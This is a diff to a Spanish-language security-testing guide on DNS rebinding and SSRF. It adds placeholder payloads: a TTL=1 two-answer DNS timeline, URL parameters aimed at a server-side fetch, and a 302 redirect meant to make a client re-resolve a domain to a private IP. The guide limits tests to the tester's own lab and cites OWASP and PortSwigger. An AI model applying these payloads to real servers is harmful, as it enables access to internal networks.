@@ -8,7 +8,65 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
-## 🔬 Pruebas por escenario
+> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
+
+## 💉 Payloads básicos
+
+### Dominio propio con dos respuestas
+
+```text
+{DOMINIO_REBIND_PROPIO}  A  {IP_PUBLICA_PROPIA}      TTL=1
+{DOMINIO_REBIND_PROPIO}  A  {IP_PRIVADA_LAB_PROPIA}  TTL=1 (después)
+```
+
+**Cuándo usarlo:** Cronología de respuestas, no archivo de zona. Las dos IP deben ser propias; un resolver puede imponer TTL mínimo o fijar resolución.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md).
+
+
+### Observar resolución desde el cliente
+
+```bash
+dig {DOMINIO_REBIND_PROPIO} A +noall +answer
+dig {DOMINIO_REBIND_PROPIO} AAAA +noall +answer
+```
+
+**Cuándo usarlo:** Estas consultas solo confirman el DNS de prueba, no que la aplicación sea vulnerable.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md).
+
+
+## 🧭 Payloads por contexto
+
+### URL entregada a un fetch permitido
+
+```text
+{"url":"http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary"}
+?callback=http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary
+```
+
+**Cuándo usarlo:** Son alternativas. Registrar IP efectiva de la conexión en el servidor de laboratorio.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/ssrf).
+
+
+## 🔥 Payloads avanzados
+
+### Revalidación tras una redirección
+
+```http
+HTTP/1.1 302 Found
+Location: http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/segunda
+Connection: close
+Content-Length: 0
+```
+
+**Cuándo usarlo:** Tras servir este 302, cambiar el A del mismo dominio de IP pública propia a IP privada de laboratorio. Confirmar segunda resolución y conexión reales; el 302 aislado no prueba rebinding.
+
+**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+
+
+## 🔬 Pruebas guiadas por escenario
 
 ### 1. Dos respuestas A de laboratorio
 
@@ -22,7 +80,7 @@ dig +short A {DOMINIO_REBIND_PROPIO}
 
 **Interpretación:** El cambio confirma configuración del laboratorio, no una vulnerabilidad de la aplicación.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md).
 
 ### 2. TTL de prueba
 
@@ -34,7 +92,7 @@ dig {DOMINIO_REBIND_PROPIO} A +noall +answer
 
 **Interpretación:** Los resolvers pueden imponer TTL mínimo; registrar el valor real antes de atribuir comportamiento.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md).
 
 ### 3. Primera conexión pública
 
@@ -46,7 +104,7 @@ dig {DOMINIO_REBIND_PROPIO} A +noall +answer
 
 **Interpretación:** La primera respuesta debe llegar a un canary propio. No dirigir la segunda a redes ajenas.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/ssrf).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).
 
 ### 4. Segunda conexión a IP de laboratorio
 
@@ -59,7 +117,7 @@ DNS 2: {DOMINIO_REBIND_PROPIO} -> {IP_PRIVADA_LAB_PROPIA}
 
 **Interpretación:** Solo en laboratorio propio; observar conexión real a la segunda IP y controles de red.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
 
 ### 5. Host HTTP conservado
 
@@ -72,21 +130,21 @@ Host: {DOMINIO_REBIND_PROPIO}
 
 **Interpretación:** El servidor del laboratorio debe registrar Host e IP local de destino; no confundirlo con DNS normal.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/ssrf).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).
 
 ### 6. Redirección y nueva resolución
 
-**Objetivo:** Probar la política de destino en cada salto controlado.
+**Objetivo:** Probar si el cliente vuelve a resolver el mismo dominio propio después de seguir un 302.
 
 ```text
-302 Location: http://{DOMINIO_REBIND_PROPIO}/segunda
-A inicial: {IP_PUBLICA_PROPIA}
-A posterior: {IP_PRIVADA_LAB_PROPIA}
+302 Location: http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/segunda
+A antes del 302: {IP_PUBLICA_PROPIA}
+A después del 302: {IP_PRIVADA_LAB_PROPIA}
 ```
 
-**Interpretación:** Un validador robusto comprueba cada resolución y cada redirección. Usar dos hosts propios.
+**Interpretación:** Solo es rebinding si se observa una segunda consulta DNS y una conexión a la IP del laboratorio. Un 302 por sí solo no lo prueba.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
 
 ### 7. Familias IPv4 e IPv6
 
@@ -99,7 +157,7 @@ dig +short AAAA {DOMINIO_REBIND_PROPIO}
 
 **Interpretación:** Una familia no filtrada solo es relevante si la aplicación la conecta efectivamente.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
 
 ## ✅ Evidencia mínima
 
